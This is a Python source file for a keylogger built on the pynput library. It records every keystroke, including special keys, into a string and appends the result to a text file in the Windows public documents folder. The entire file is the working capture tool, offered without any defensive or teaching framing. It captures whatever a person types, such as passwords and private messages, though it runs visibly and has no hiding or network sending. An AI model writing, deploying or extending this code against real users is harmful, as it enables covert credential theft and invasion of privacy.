from pynput.keyboard import Key, Listener
import os

class Keylogger:
    def __init__(self):
        self.log = ""
        self.listener = Listener(on_press=self.on_press, on_release=self.on_release)
        self.log_file_path = os.path.abspath("C:\\Users\\Public\\Documents\\keylogger\\keylogger.txt")

    def on_press(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            if key == Key.space:
                self.log += " "
            elif key == Key.enter:
                self.log += "\n"
            else:
                self.log += " " + str(key) + " "

    def on_release(self, key):
        if key == Key.esc:
            return False  # Stop listener

    def start(self):
        self.listener.start()

    def stop(self):
        self.listener.stop()

    def save_log(self):
        with open(self.log_file_path, 'a') as log_file:
            log_file.write(self.log)
        print(f"Log saved to {self.log_file_path}")

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()
    input("Press Enter to stop...\n")
    keylogger.stop()
    keylogger.save_log()
    print(f"Log file location: {keylogger.log_file_path}")
